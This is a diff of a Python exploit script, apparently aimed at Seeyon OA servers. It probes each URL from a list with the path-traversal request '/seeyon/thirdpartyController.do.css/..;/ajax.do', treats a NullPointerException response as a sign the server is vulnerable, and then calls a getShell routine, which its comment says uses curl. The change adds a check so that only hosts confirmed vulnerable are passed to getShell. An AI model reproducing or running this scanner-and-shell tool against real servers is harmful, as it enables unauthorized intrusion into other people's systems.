@@ -7,8 +7,7 @@ def poc(url):    #使用poc验证
     poc = '/seeyon/thirdpartyController.do.css/..;/ajax.do'
     verUrl = str(url).replace(" ","").strip("/").strip() + poc    #url处理，防止出错。
     if '<font id="THROWABLE_MESSAGE">java.lang.NullPointerException:null</font>' in s.get(verUrl,verify=False).text:
-        return url
-
+         return url
 
 def getShell(vulnUrl):     #调用curl
     host = str(vulnUrl).replace("http://","").replace("/","")
@@ -30,7 +29,8 @@ if __name__ == '__main__':
         checkUrl = f.readlines()
         for i in checkUrl:
             i = i.strip()
-            getShell(poc(i))
+            if not poc(i) == None:    #poc验证可以不加，但是写都写了，不用怪可惜的。
+                getShell(i)
 
 
 #by flywhu
